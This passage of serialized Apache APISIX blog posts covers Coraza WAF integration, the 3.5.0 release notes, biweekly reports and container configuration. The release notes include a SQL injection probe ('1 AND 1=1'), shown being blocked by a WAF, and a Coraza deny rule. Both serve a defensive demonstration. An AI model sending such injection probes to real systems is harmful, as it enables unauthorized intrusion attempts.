Coraza, continuously improving and optimizing the code, and addressing vulnerabilities and security issues. Users benefit from these timely updates, maintaining the security and stability of their applications.\\n\\nThe Coraza open-source community coordinates with the development and evolution of APISIX. As a WAF solution for APISIX, Coraza can closely integrate with the features and capabilities of APISIX to meet users\' security needs. Collaboration and feedback from the open-source community contribute to driving further development of the solution and ensuring its compatibility and consistency with APISIX.\\n\\n### Support Wasm Plugins\\n\\nAPISIX supports developing plugins with [WebAssembly (Wasm)](https://apisix.apache.org/blog/2021/11/19/apisix-supports-wasm/#how-to-use-wasm-in-apache-apisix), and Coraza also provides Wasm plugins as an option. Therefore, integrating Coraza with APISIX incurs relatively low costs.\\n\\nWasm can be utilized cross-platform, allowing APISIX and Coraza to work seamlessly without additional extensive modifications or adaptations. This eliminates extensive code modifications and adaptations.\\n\\n**The benefits of this low-cost integration include:**\\n\\n1. Verified Solution: Although the Coraza wasm plugin was not developed specifically for APISIX, it has been validated on the Istio platform. In terms of functionality, the plugin can provide guarantees consistent with Istio.\\n2. Low Development and Maintenance Costs: The Coraza wasm plugin is a platform-independent binary file, making its release and development process extremely convenient. Extending the Coraza wasm plugin can be achieved with proxy-wasm-go-sdk, where releasing only requires updating the binary file, further simplifying the process.\\n\\n### Using Core Rule Set\\n\\nTraditional WAF solutions often require the installation and configuration of specific modules on web servers, such as NGINX, to integrate and communicate with the WAF engine. This integration process can be cumbersome for Ops engineers, involving complex configurations and compatibility issues with different software versions.\\n\\nHowever, Coraza utilizes the Core Rule Set (CRS) as its rule set. CRS is a widely adopted and validated open-source set of rules designed for the detection and defense of common attacks in web applications. What sets Coraza apart from traditional WAF solutions is its ability to directly parse and execute CRS rules without additional compilation of NGINX. The use of CRS provides enhanced security protection for APISIX along with support from the CRS community.\\n\\n**This design brings several important benefits:**\\n\\n- Simplified Maintenance for Coraza: As it doesn\'t require the support of nginx_module, the Ops engineers do not need to deal with complex module installation and configuration processes. Instead, they can focus on maintaining and updating the CRS rule set, ensuring it contains the latest security rules and fixes.\\n\\n- Increased Stability and Reliability of the Entire Solution: CRS, as a mature rule set, has undergone long-term practice and improvement and has been widely adopted and supported by the community. This means Coraza users can benefit from the collective wisdom of the CRS community and receive timely security updates and fixes.\\n\\n### Easy Installation and Deployment\\n\\nCoraza doesn\'t require the support of nginx_module, making it easy to maintain. This is because Coraza is an independent WAF that doesn\'t rely on NGINX or support from other web server modules and can integrate with different web servers.\\n\\nThis independence makes Coraza\'s maintenance easier as it doesn\'t need to depend on specific web server configurations or module installations. Administrators can configure and manage Coraza independently without worrying about compatibility with other server components.\\n\\n## How to Use Coraza in APISIX\\n\\nPlease note that to use Coraza functionality, you need to install the APISIX master version. Currently, this feature is in the preview stage, and it is expected to be officially supported in version 3.6.0.\\n\\n### Configuring APISIX Integration with coraza-proxy-wasm\\n\\nNavigate to the directory of `APISIX`\\n\\n```\\ncd /home/ubuntu/apisix-master\\n```\\n\\nModify the configuration `file conf/config-default.yaml` and cancel the original comment in the wasm configuration\\n\\n```\\nwasm:\\n  plugins:\\n    - name: coraza-filter\\n      priority: 7999\\n      file: /home/ubuntu/coraza-proxy-wasm/build/main.wasm # Write absolute path\\n```\\n\\n### Configuring the `/anything` route to integrate Coraza\'s WAF rules\\n\\nReconfigure routing and enable the `coraza-filter` plugin\\n\\n```\\ncurl -i http://127.0.0.1:9180/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'{\\n  \\"uri\\": \\"/anything\\",\\n  \\"plugins\\": {\\n    \\"coraza-filter\\": {\\n      \\"conf\\": {\\n        \\"directives_map\\": {\\n          \\"default\\": [\\n            \\"SecDebugLogLevel 9\\",\\n            \\"SecRuleEngine On\\",\\n            \\"SecRule REQUEST_URI \\\\\\"@beginsWith /anything\\\\\\" \\\\\\"id:101,phase:1,t:lowercase,deny\\\\\\"\\"\\n          ]\\n        },\\n        \\"default_directives\\": \\"default\\"\\n      }\\n    }\\n  },\\n  \\"upstream\\": {\\n    \\"type\\": \\"roundrobin\\",\\n    \\"nodes\\": {\\n      \\"httpbin.org:80\\": 1\\n    }\\n  }\\n}\'\\n```\\n\\nTest the WAF rules and we can see 403\\n\\n```shell\\ncurl http://localhost:9080/anything -v\\n*   Trying 127.0.0.1:9080...\\n* TCP_NODELAY set\\n* Connected to localhost (127.0.0.1) port 9080 (#0)\\n> GET /anything HTTP/1.1\\n> Host: localhost:9080\\n> User-Agent: curl/7.68.0\\n> Accept: */*\\n>\\n* Mark bundle as not supporting multiuse\\n< HTTP/1.1 403 Forbidden\\n< Date: Thu, 31 Aug 2023 09:09:18 GMT\\n< Content-Type: text/html; charset=utf-8\\n< Content-Length: 225\\n< Connection: keep-alive\\n< Server: APISIX/3.4.0\\n<\\n<html>\\n<head><title>403 Forbidden</title></head>\\n<body>\\n<center><h1>403 Forbidden</h1></center>\\n<hr><center>openresty</center>\\n<p><em>Powered by <a href=\\"https://apisix.apache.org/\\">APISIX</a>.</em></p></body>\\n</html>\\n* Connection #0 to host localhost left intact\\n```\\n\\nCheck logs `logs/error.log`\\n\\n```text\\n2023/08/31 09:20:39 [info] 126240#126240: *23933 Transaction interrupted tx_id=\\"JVhHVfDuGjVbfgvDjik\\" context_id=2 action=\\"deny\\" phase=\\"http_request_headers\\", client: 127.0.0.1, server: _, request: \\"GET /anything HTTP/1.1\\", host: \\"localhost:9080\\"\\n2023/08/31 09:20:39 [debug] 126240#126240: *23933 Interruption already handled, sending downstream the local response tx_id=\\"JVhHVfDuGjVbfgvDjik\\" context_id=2 interruption_handled_phase=\\"http_request_headers\\"\\n```\\n\\n## Conclusion\\n\\nCoraza is a powerful WAF framework that offers extensive security features and flexible configuration options, suitable for protecting enterprise web applications from various threats. The integration of APISIX with Coraza is a significant new feature of APISIX. Coraza, as an easy-to-maintain solution, integrated with APISIX, provides enterprises with robust API management and security features."},{"id":"Release Apache APISIX 3.5.0","metadata":{"permalink":"/blog/2023/09/01/release-apache-apisix-3.5.0","source":"@site/blog/2023/09/01/release-apache-apisix-3.5.0.md","title":"Release Apache APISIX 3.5.0","description":"The Apache APISIX 3.5.0 version is released on September 1, 2023. This release includes many exciting new features and improvements to user experiences.","date":"2023-09-01T00:00:00.000Z","formattedDate":"September 1, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":6.065,"truncated":true,"authors":[{"name":"Xin Rong","title":"Author","url":"https://github.com/AlinsRan","image_url":"https://avatars.githubusercontent.com/u/79972061?v=4","imageURL":"https://avatars.githubusercontent.com/u/79972061?v=4"},{"name":"Traky Deng","title":"Technical Writer","url":"https://github.com/kayx23","image_url":"https://avatars.githubusercontent.com/u/39619599?v=4","imageURL":"https://avatars.githubusercontent.com/u/39619599?v=4"}],"prevItem":{"title":"Coraza: Elevating APISIX with Cutting-Edge WAF Features","permalink":"/blog/2023/09/08/APISIX-integrates-with-Coraza"},"nextItem":{"title":"Biweekly Report (August 14 - August 27)","permalink":"/blog/2023/08/30/weekly-report"}},"content":"We are pleased to present Apache APISIX 3.5.0 with exciting new features and improvements to user experiences.\\n\\n\x3c!--truncate--\x3e\\n\\nThis new release adds a number of new features, including the dynamic configuration of TLS versions at the host level, integration with Chaitin WAF, forced deletion of resources, the use of environmental variables in configuration file when deploying APISIX in standalone mode, and more.\\n\\nThere are a few important changes included in this release. Should you find these changes impacting your operations, it is strongly recommended that you plan accordingly for a seamless upgrade.\\n\\n## Breaking Changes\\n\\n### Remove snowflake algorithm support in `request-id` plugin\\n\\nRemove snowflake algorithm support in `request-id` plugin. The algorithm introduces an unnecessary dependency on etcd, which could significantly impact APISIX performance when etcd becomes unavailable. Please consider using the `uuid` option in algorithm instead.\\n\\nFor more background information, see the [proposal](https://lists.apache.org/thread/p4wwwwmtf024pnbccs5psncxg8yqvh9c) in the mailing list.\\n\\nPR for this change is [#9715](https://github.com/apache/apisix/pull/9715).\\n\\n### Remove the support for OpenResty 1.19\\n\\nIf you are currently using this version, please plan for an upgrade to OpenResty version 1.21 and above.\\n\\nPR for this change is [#9913](https://github.com/apache/apisix/pull/9913).\\n\\n### Improve the usability of L4 and L7 proxies and remove `apisix.stream_proxy.only`\\n\\nImprove the usability of L4 and L7 proxies. This change removes the `apisix.stream_proxy.only` option and simplifies the usage to enable and disable L4 and L7 proxies.\\n\\nL4 and L7 proxies are now be enabled as follows in the `config.yaml` file:\\n\\n- To enable L7 proxy (enabled by default): `apisix.proxy_mode: http`\\n- To enable L4 proxy: `apisix.proxy_mode: stream`\\n- To enable both L7 and L4 proxy: `apisix.proxy_mode: http&stream`\\n\\nFor more information about how to work with stream proxy after the change, see [how to enable stream proxy](https://apisix.apache.org/docs/apisix/next/stream-proxy/#how-to-enable-stream-proxy).\\n\\nPR for this change is [#9607](https://github.com/apache/apisix/pull/9607).\\n\\n### Do not allow the use of `allowlist` and `denylist` at the same time in `ua-restriction` plugin\\n\\nThe use of `allowlist` and `denylist` in `ua-restriction` plugin is now mutually exclusive. You should configure only one of the two options.\\n\\nPR for this change is [#9841](https://github.com/apache/apisix/pull/9841).\\n\\n### Refactor and improve the plugin interface in Admin API\\n\\nThe interface of getting properties of all plugins via `/apisix/admin/plugins?all=true` will be deprecated soon. Going forward, Admin API will only support getting properties of one plugin at a time. It is recommended that you use the following endpoint and parameters for your requirements:\\n\\n```text\\n/apisix/admin/plugins/{plugin_name}?subsystem={subsystem}\\n```\\n\\nThe `subsystem` parameter is optional and defaults to `http` if not configured. The value could be set to `http`, `stream` or `http&stream`, corresponding to plugins available on L7 and/or L4.\\n\\nAlternatively, you could use /v1/schema to obtain and parse schema for all plugins in the [Control API](https://apisix.apache.org/docs/apisix/control-api/#get-v1schema).\\n\\nIf you would like to obtain a list of plugin names only, you may do so with the following:\\n\\n```\\n/apisix/admin/plugins/list?subsystem={subsystem}\\n```\\n\\nFor more details, see [Plugins](https://apisix.apache.org/docs/apisix/next/admin-api/#plugin) in Admin API.\\n\\nPR for this change is [#9580](https://github.com/apache/apisix/pull/9580).\\n\\n## New Features\\n\\n### Support the dynamic configuration of TLS versions at the host level\\n\\nSupport the configuration of TLS versions for individual SNI at runtime. The configuration takes precedence over the `ssl_protocols` static configurations in `config-default.yaml` or `config.yaml` and does not require a reloading of the APISIX, providing a more fine-grained approach to integrate with your infrastructure.\\n\\nFor example, you can configure the domain `test.com` to accept TLS connections with TLS versions 1.2 and 1.3 with the following:\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/ssls/1 -X PUT \\\\\\n  -H \\"X-API-KEY: ${ADMIN_API_KEY}\\" \\\\\\n  -d \'{\\n    \\"cert\\": \\"$cert\\",\\n    \\"key\\": \\"$key\\",\\n    \\"snis\\": [\\"test.com\\"],\\n    \\"ssl_protocols\\": [\\n        \\"TLSv1.2\\",\\n        \\"TLSv1.3\\"\\n    ]\\n  }\'\\n```\\n\\nFor more information about the feature and examples, see [SSL Protocol](https://apisix.apache.org/docs/apisix/next/ssl-protocol/).\\n\\nPR for this feature is [#9903](https://github.com/apache/apisix/pull/9903).\\n\\n### Support forced deletion of resources\\n\\nSupport forced deletion of resources with Admin API. By default, the Admin API checks for references between resources and does not allow the deletion of resources in use.\\n\\nWith this new feature, you can make a force deletion by sending a DELETE request with URL parameter `force=true`, such as the following:\\n\\n```shell\\ncurl \\"http://127.0.0.1:9180/apisix/admin/upstreams/1?force=true\\" -X DELETE \\\\\\n  -H \\"X-API-KEY: ${ADMIN_API_KEY}\\"\\n```\\n\\nFor more information about the feature and examples, see [Force Delete](https://apisix.apache.org/docs/apisix/next/admin-api/#force-delete).\\n\\nPR for this feature is [#9810](https://github.com/apache/apisix/pull/9810).\\n\\n### Support environment variables in `apisix.yaml`\\n\\nSupport the use of environment variables in `apisix.yaml`.\\n\\nFor example, you can set the host IP and port of the upstream service as enviornment variables and use the variables in `apisix.yaml` as follows:\\n\\n```shell\\nroutes:\\n  -\\n    uri: \\"/test\\"\\n    upstream:\\n      nodes:\\n        \\"${{HOST_IP}}:${{PORT}}\\": 1\\n      type: roundrobin\\n#END\\n```\\n\\nFor more information about the feature and examples, see [Using Environment Variables](https://apisix.apache.org/docs/apisix/next/admin-api/#using-environment-variables) in Admin API.\\n\\nPR for this feature is [#9855](https://github.com/apache/apisix/pull/9855).\\n\\n### Add schema validation endpoint in Admin API\\n\\nAdd an `/apisix/admin/schema/validate/{resource}` endpoint to the Admin API to validate the schema of a configuration. You can now verify the configuration correctness without sending a request to the endpoint for resource creation.\\n\\nFor example, you can validate the schema of a route with the following:\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/schema/validate/routes -i -X POST \\\\\\n  -H \\"X-API-KEY: ${ADMIN_API_KEY}\\" \\\\\\n  -d \'{\\n    \\"uri\\": 1980,\\n    \\"upstream\\": {\\n        \\"scheme\\": \\"https\\",\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n          \\"nghttp2.org\\": 1\\n        }\\n     }\\n  }\'\\n```\\n\\nAs this schema is incorrect, you should see a response similar to the following:\\n\\n```text\\nHTTP/1.1 400 Bad Request\\n...\\n{\\"error_msg\\":\\"property \\\\\\"uri\\\\\\" validation failed: wrong type: expected string, got number\\"}\\n```\\n\\nFor more information about the feature and examples, see [Schema Validation](https://apisix.apache.org/docs/apisix/next/admin-api/#schema-validation) in Admin API.\\n\\nPR for this feature is [#10065](https://github.com/apache/apisix/pull/10065).\\n\\n### Support integration with Chaitin WAF with the `chaitin-waf` plugin\\n\\nSupport the integration with Chaitin WAF with the `chaitin-waf` plugin, which forwards the gateway traffic to Chaitin WAF for inspection and detection of malicious traffic.\\n\\nFor example, you can configure the address of Chaitin WAF on a plugin metadata, which is referenced by all the  `chaitin-waf` plugin instances. Configure the `host` to be a Chaitin SafeLine WAF detection service host, unix domain socket, IP, or domain; as well as the `port`, such as the following:\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/plugin_metadata/chaitin-waf -X PUT \\\\\\n  -H \\"X-API-KEY: ${ADMIN_API_KEY}\\" \\\\\\n  -d \'{\\n  \\"nodes\\":[\\n      {\\n        \\"host\\": \\"unix:/path/to/safeline/resources/detector/snserver.sock\\",\\n        \\"port\\": 8000\\n      }\\n    ]\\n  }\'\\n```\\n\\nYou can then enable the plugin on a route and only forward traffic that matches the specified conditions to WAF:\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/routes/1 -X PUT \\\\\\n  -H \\"X-API-KEY: ${ADMIN_API_KEY}\\" \\\\\\n  -d \'{\\n   \\"uri\\": \\"/*\\",\\n   \\"plugins\\": {\\n       \\"chaitin-waf\\": {\\n           \\"match\\": [\\n                {\\n                  \\"vars\\": [\\n                    [\\"http_waf\\",\\"==\\",\\"true\\"]\\n                  ]\\n                }\\n            ]\\n        }\\n    },\\n   \\"upstream\\": {\\n       \\"type\\": \\"roundrobin\\",\\n       \\"nodes\\": {\\n          \\"httpbun.org:80\\": 1\\n        }\\n     }\\n  }\'\\n```\\n\\nIf a potential malicious request is detected, such as the following request, which attempts an injection attack:\\n\\n```shell\\ncurl -i \\"http://127.0.0.1:9080/getid=1%20AND%201=1\\" \\\\\\n  -H \\"Host: httpbun.org\\" \\\\\\n  -H \\"waf: true\\"\\n```\\n\\nYou should see a response similar to the following:\\n\\n```text\\nHTTP/1.1 403 Forbidden\\n...\\nX-APISIX-CHAITIN-WAF: yes\\nX-APISIX-CHAITIN-WAF-TIME: 2\\nX-APISIX-CHAITIN-WAF-ACTION: reject\\nX-APISIX-CHAITIN-WAF-STATUS: 403\\n...\\n{\\"code\\": 403, \\"success\\":false, \\"message\\": \\"blocked by Chaitin SafeLine Web Application Firewall\\", \\"event_id\\": \\"51a268653f2c4189bfa3ec66afbcb26d\\"}\\n```\\n\\nFor more information about the feature and examples, see [`chaitin-waf`](https://apisix.apache.org/docs/apisix/next/plugins/chaitin-waf/) plugin doc.\\n\\nPR for this feature is [#9838](https://github.com/apache/apisix/pull/9838).\\n\\n## Other Updates\\n\\n- Support the configuration of proxy servers in `openid-connect` plugin ([PR #9948](https://github.com/apache/apisix/pull/9948))\\n- Support sending response headers from the OPA server to upstream services in the `opa` plugin ([PR #9710](https://github.com/apache/apisix/pull/9710))\\n- Support the use of vars in the `file-logger` plugin to allow conditional logging ([PR #9712](https://github.com/apache/apisix/pull/9712))\\n- Support the configuration of response headers in the `mocking` plugin ([PR #9720](https://github.com/apache/apisix/pull/9720))\\n\\n## Changelog\\n\\nFor a complete list of changes in this release, please see [CHANGELOG](https://github.com/apache/apisix/blob/release/3.5/CHANGELOG.md#350)."},{"id":"Biweekly Report (August 14 - August 27)","metadata":{"permalink":"/blog/2023/08/30/weekly-report","source":"@site/blog/2023/08/30/weekly-report.md","title":"Biweekly Report (August 14 - August 27)","description":"The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.","date":"2023-08-30T00:00:00.000Z","formattedDate":"August 30, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.28,"truncated":true,"authors":[],"prevItem":{"title":"Release Apache APISIX 3.5.0","permalink":"/blog/2023/09/01/release-apache-apisix-3.5.0"},"nextItem":{"title":"Ops friendly Apache APISIX","permalink":"/blog/2023/08/17/ops-friendly-apisix"}},"content":"> We have recently made fixes and improvements to certain features of Apache APISIX and APISIX Ingress Controller. These include adding proxy configuration item for `openid-connect` plugin, fixing DNS resolution issue for tencent-cloud-cls, adding pass host configuration capability for ApisixUpstream resource, upgrading Go toolchain to v1.20, etc. For more details, please refer to the biweekly report.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX grew up as a community from the first day it was open-sourced, and quickly became the most active open-source API gateway project in the world. These achievements are inseparable from the joint efforts of community partners.\\n\\nFrom 8.14 to 8.27, 15 contributors submitted 32 commits for Apache APISIX. Thank you for your contributions to Apache APISIX.\\n\\nWe have recently fixed and improved some features, and the summary of the updates is as follows:\\n\\n1. Add proxy configuration item for `openid-connect` plugin\\n\\n2. Fix DNS resolution issue for tencent-cloud-cls\\n\\n3. Admin-API supports api schema validation\\n\\n4. `WASM` plugin supports passing native JSON data structure\\n\\n5. Add pass host configuration capability for ApisixUpstream resource\\n\\n6. Upgrade Go toolchain to v1.20\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together.\\" The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/08/28/tdXTURvu_%E5%85%A8%E9%83%A8%E8%B4%A1%E7%8C%AE%E8%80%85.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/08/28/J0at5ZSF_%E6%96%B0%E6%99%8B%E8%B4%A1%E7%8C%AE%E8%80%85.png)\\n\\n## Highlights of Recent Features\\n\\n### Apache APISIX\\n\\n- [Add proxy configuration item for `openid-connect` plugin](https://github.com/apache/apisix/pull/9948) (Contributor: [darkSheep404](https://github.com/darkSheep404))\\n\\n- [Fix DNS resolution issue for tencent-cloud-cls](https://github.com/apache/apisix/pull/9843) (Contributor: [jiangfucheng]((https://github.com/jiangfucheng))\\n\\n- [Admin-API supports api schema validation](https://github.com/apache/apisix/pull/10065) (Contributor: [kingluo](https://github.com/kingluo))\\n\\n- [`WASM` plugin supports passing native JSON data structure](https://github.com/apache/apisix/pull/10072) (Contributor: [Sn0rt](https://github.com/Sn0rt))\\n\\n### APISIX Ingress Controller\\n\\n- [Add pass host configuration capability for ApisixUpstream resource](https://github.com/apache/apisix-ingress-controller/pull/1889) (Contributor: [ikatlinsky](https://github.com/ikatlinsky))\\n\\n- [Upgrade Go toolchain to v1.20](https://github.com/apache/apisix-ingress-controller/pull/1788) (Contributor: [WVenus](https://github.com/WVenus))\\n\\n## Recent Blog Recommendations\\n\\n- [Rate Limit Your APIs With Apache APISIX](https://apisix.apache.org/blog/2023/08/14/rate-limit/)\\n  \\n  In this article, we will look at examples of how we can use the rate limiting plugins in APISIX. You can find the complete configuration files and instructions to deploy for this article in this repository.\\n\\n- [Release Apache APISIX 3.2.2](https://apisix.apache.org/blog/2023/07/23/release-apache-apisix-3.2.2/)\\n\\n  We are pleased to present Apache APISIX 3.2.2 with a list of fixes and optimizations.\\n  \\n- [Creating a Custom Data Mask Plugin](https://apisix.apache.org/blog/2023/07/20/data-mask-plugin/)\\n\\n  In this article, we will look at how you can create and run this plugin from the ground up while learning some basics of APISIX plugin development in Lua.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Ops friendly Apache APISIX","metadata":{"permalink":"/blog/2023/08/17/ops-friendly-apisix","source":"@site/blog/2023/08/17/ops-friendly-apisix.md","title":"Ops friendly Apache APISIX","description":"Though I always worked on the Dev side of IT, I was also interested in the Ops side. I even had a short experience being a WebSphere admin: I used it several times, helping Ops deal with the Admin console while being a developer. Providing a single package that Ops can configure and deploy in different environments is very important. As a JVM developer, I\'ve been happy using Spring Boot and its wealth of configuration options: command-line parameters, JVM parameters, files, profiles, environment variables, etc. In this short post, I\'d like to describe how you can do the same with Apache APISIX in the context of containers.\\n","date":"2023-08-17T00:00:00.000Z","formattedDate":"August 17, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":2.44,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Biweekly Report (August 14 - August 27)","permalink":"/blog/2023/08/30/weekly-report"},"nextItem":{"title":"Biweekly Report (July 31 - August 13)","permalink":"/blog/2023/08/15/weekly-report"}},"content":">In this short post, I\'d like to describe how to leverage Apache APISIX in containers, drawing on personal experiences with Spring Boot and WebSphere administration.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/ops-friendly-apisix/\\" />\\n</head>\\n\\nThough I always worked on the Dev side of IT, I was also interested in the Ops side. I even had a short experience being a WebSphere admin: I used it several times, helping Ops deal with the Admin console while being a developer.\\n\\nProviding a single package that Ops can configure and deploy in different environments is very important. As a JVM developer, I\'ve been happy using Spring Boot and its wealth of configuration options: command-line parameters, JVM parameters, files, profiles, environment variables, etc.\\n\\n## File-based configuration\\n\\nThe foundation of configuring Apache APISIX is file-based. The default values are found in the `/usr/local/apisix/conf/apisix/config-default.yaml` configuration file. For example, by default, Apache APISIX runs on port `9080`, and the admin port is `9180`. That\'s because of the default configuration:\\n\\n```yaml\\napisix:\\n  node_listen:\\n    - 9080           #1\\n\\n#...\\n\\ndeployment:\\n  admin:\\n    admin_listen:\\n      ip: 0.0.0.0\\n      port: 9180     #2\\n```\\n\\n1. Regular port\\n2. Admin port\\n\\nTo override values, we need to provide a file named `config.yaml` in the `/usr/local/apisix/conf/apisix` directory:\\n\\n```yaml\\napisix:\\n  node_listen:\\n    - 9090           #1\\ndeployment:\\n  admin:\\n    admin_listen:\\n      port: 9190     #1\\n```\\n\\n1. Override values\\n\\nNow, Apache APISIX should run on port `9090`, and the admin port should be `9190`. Here\'s how to run the Apache APISIX container with the above configuration:\\n\\n```bash\\ndocker run -it --rm apache/apisix:3.4.1-debian \\\\\\n                 -p 9090:9090 -p 9190:9190 \\\\\\n                 -v ./config.yaml:/usr/local/apisix/conf/apisix/config.yaml\\n```\\n\\n## Environment-based configuration\\n\\nThe downside of a pure file-based configuration is that you must provide a dedicated file for each environment, even if only a single parameter changes. Apache APISIX allows replacement via environment variables in the configuration file to account for that.\\n\\n```yaml\\napisix:\\n  node_listen:\\n    - ${{APISIX_NODE_LISTEN:=}}                  #1\\ndeployment:\\n  admin:\\n    admin_listen:\\n      port: ${{DEPLOYMENT_ADMIN_ADMIN_LISTEN:=}} #1\\n```\\n\\n1. Replace the placeholder with its environment variable value at runtime\\n\\nWe can reuse the same file in every environment and hydrate it with the context-dependent environment variables:\\n\\n```bash\\ndocker run -it --rm apache/apisix:3.4.1-debian \\\\\\n                 -e APISIX_NODE_LISTEN=9090 \\\\\\n                 -e DEPLOYMENT_ADMIN_ADMIN_LISTEN=9190 \\\\\\n                 -p 9090:9090 -p 9190:9190 \\\\\\n                 -v ./config.yaml:/usr/local/apisix/conf/apisix/config.yaml\\n```\\n\\nIcing on the cake, we can also offer a default value:\\n\\n```yaml\\napisix:\\n  node_listen:\\n    - ${{APISIX_NODE_LISTEN:=9080}}                  #1\\ndeployment:\\n  admin:\\n    admin_listen:\\n      port: ${{DEPLOYMENT_ADMIN_ADMIN_LISTEN:=9180}} #1\\n```\\n\\n1. If no environment variable is provided, use those ports; otherwise, use the environment variables\' value\\n\\nThe trick works in standalone mode with the `apisix. yaml` file. You can parameterize every context-dependent variable **and** secrets with it:\\n\\n```yaml\\nroutes:\\n  - uri: /*\\n    upstream:\\n      nodes:\\n        \\"httpbin:80\\": 1\\n    plugins:\\n      openid-connect:\\n        client_id: apisix\\n        client_secret: ${{OIDC_SECRET}}\\n        discovery: https://${{OIDC_ISSUER}}/.well-known/openid-configuration\\n        redirect_uri: http://localhost:9080/callback\\n        scope: openid\\n        session:\\n          secret: ${{SESSION_SECRET}}\\n```\\n\\n## Conclusion\\n\\nWhen configuring Apache APISIX, we should ensure it\'s as operable as possible. In this post, I\'ve described several ways to make it so.\\n\\nHappy Apache APISIX!\\n\\n**To go further:**\\n\\n* [Default configuration](https://github.com/apache/apisix/blob/master/conf/config-default.yaml)\\n* [Configuration file switching based on environment variables](https://apisix.apache.org/docs/apisix/profile/)"},{"id":"Biweekly Report (July 31 - August 13)","metadata":{"permalink":"/blog/2023/08/15/weekly-report","source":"@site/blog/2023/08/15/weekly-report.md","title":"Biweekly Report (July 31 - August 13)","description":"The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.","date":"2023-08-15T00:00:00.000Z","formattedDate":"August 15, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.11,"truncated":true,"authors":[],"prevItem":{"title":"Ops friendly Apache APISIX","permalink":"/blog/2023/08/17/ops-friendly-apisix"},"nextItem":{"title":"Rate Limit Your APIs With Apache APISIX","permalink":"/blog/2023/08/14/rate-limit"}},"content":"> We have recently made fixes and improvements to certain features of Apache APISIX. These include supporting the `chaitin-waf` plugin, configuring TLS handshake protocol for specified SNI, configuring YAML file for rendering environment variables, and ensuring that the `limit-count` plugin returns the correct X-RateLimit-Reset when rejecting requests. For more details, please refer to the biweekly report.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX grew up as a community from the first day it was open-sourced, and quickly became the most active open-source API gateway project in the world. These achievements are inseparable from the joint efforts of community partners.\\n\\nFrom 7.31 to 8.13, 20 contributors submitted 37 commits for Apache APISIX. Thank you for your contributions to Apache APISIX.\\n\\nWe have recently fixed and improved some features, and the summary of the updates is as follows:\\n\\n1. Support `chaitin-waf` plugin\\n\\n2. Support host-level dynamic setting of TLS protocol version\\n\\n3. apisix.yaml configuration supports rendering configurations from environment variables\\n\\n4. `limit-count` plugin returns the correct X-RateLimit-Reset when rejecting requests\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together.\\" The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/08/15/DqCcoQzK_%E6%89%80%E6%9C%89%E8%B4%A1%E7%8C%AE%E8%80%85%E6%B5%B7%E6%8A%A5.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/08/15/2NOHboO6_%E6%96%B0%E6%99%8B%E8%B4%A1%E7%8C%AE%E8%80%85%E6%B5%B7%E6%8A%A50731-0813.png)\\n\\n## Highlights of Recent Features\\n\\n### Apache APISIX\\n\\n- [Support `chaitin-waf` plugin](https://github.com/apache/apisix/pull/9838) (Contributor: [lingsamuel](https://github.com/lingsamuel))\\n\\n- [Support host-level dynamic setting of TLS protocol version](https://github.com/apache/apisix/pull/9903) (Contributor: [AlinsRan](https://github.com/AlinsRan))\\n\\n- [apisix.yaml configuration supports rendering configurations from environment variables](https://github.com/apache/apisix/pull/9855) (Contributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek))\\n\\n- [`limit-count` plugin returns the correct X-RateLimit-Reset when rejecting requests](https://github.com/apache/apisix/pull/9978) (Contributor: [jiangfucheng](https://github.com/jiangfucheng))\\n\\n## Recent Blog Recommendations\\n\\n- [Rate Limit Your APIs With Apache APISIX](https://apisix.apache.org/blog/2023/08/14/rate-limit/)\\n  \\n  In this article, we will look at examples of how we can use the rate limiting plugins in APISIX. You can find the complete configuration files and instructions to deploy for this article in this repository.\\n\\n- [Release Apache APISIX 3.2.2](https://apisix.apache.org/blog/2023/07/23/release-apache-apisix-3.2.2/)\\n\\n  We are pleased to present Apache APISIX 3.2.2 with a list of fixes and optimizations.\\n  \\n- [Creating a Custom Data Mask Plugin](https://apisix.apache.org/blog/2023/07/20/data-mask-plugin/)\\n\\n  In this article, we will look at how you can create and run this plugin from the ground up while learning some basics of APISIX plugin development in Lua.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Rate Limit Your APIs With Apache 